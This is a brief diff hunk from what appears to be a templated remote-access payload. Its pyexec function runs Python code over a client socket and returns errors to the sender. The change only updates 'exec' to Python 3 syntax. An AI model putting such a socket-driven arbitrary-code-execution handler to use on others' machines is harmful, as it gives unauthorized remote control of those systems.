@@ -268,14 +268,14 @@ def pyexec({7},client_socket,pylib=False):
     response = ''
     if pylib:
         try:
-            exec {7}
+            exec({7})
         except Exception as e:
             {5} = "[!] PYEXEC(): {{}}".format(str(e))
             {3}(client_socket,{5})
     else:
         with stdoutIO() as s:
             try:
-                exec {7}
+                exec({7})
             except Exception as e:
                 {5} = "[!] PYEXEC(): {{}}".format(str(e))
                 {3}(client_socket,{5})
